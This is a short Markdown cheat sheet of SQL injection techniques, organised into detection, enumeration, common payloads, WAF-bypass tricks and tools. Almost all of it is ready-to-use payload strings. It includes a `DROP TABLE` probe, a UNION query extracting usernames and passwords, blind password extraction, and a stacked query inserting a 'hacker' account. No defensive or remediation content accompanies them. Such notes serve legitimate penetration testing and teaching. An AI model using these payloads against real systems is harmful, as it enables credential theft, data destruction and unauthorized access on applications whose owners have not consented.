# SQL Injection Basics

## Detection
- Append `'` or `"` to parameters and observe errors
- Use `1 OR 1=1`, `1' OR '1'='1`, `1; DROP TABLE--`
- Time-based: `1' AND SLEEP(5)--` (MySQL), `1'; WAITFOR DELAY '0:0:5'--` (MSSQL)
- Boolean-based: observe response differences with `AND 1=1` vs `AND 1=2`

## Enumeration
- Determine column count: `ORDER BY 1`, `ORDER BY 2`, ... until error
- UNION injection: `UNION SELECT NULL,NULL,...` (match column count)
- Extract DB version: `@@version` (MSSQL), `version()` (MySQL/PostgreSQL)
- List tables: `information_schema.tables` (MySQL), `pg_tables` (PostgreSQL)

## Common Payloads
- Union: `' UNION SELECT username,password FROM users--`
- Blind: `' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--`
- Stacked: `'; INSERT INTO users VALUES('hacker','hacked')--`

## Bypass Techniques
- Case variation: `SeLeCt`, `UnIoN`
- Inline comments: `UN/**/ION SE/**/LECT`
- URL encoding: `%27` for `'`, `%20` for space
- Double URL encoding: `%2527`
- Unicode normalization
- Parameter pollution: `?id=1&id=2`
- Use `/**/` instead of spaces
- Hex encoding: `0x61646D696E`

## Tools
- sqlmap for automated exploitation
- Burp Suite Intruder for manual testing
- Manual crafting for WAF bypass
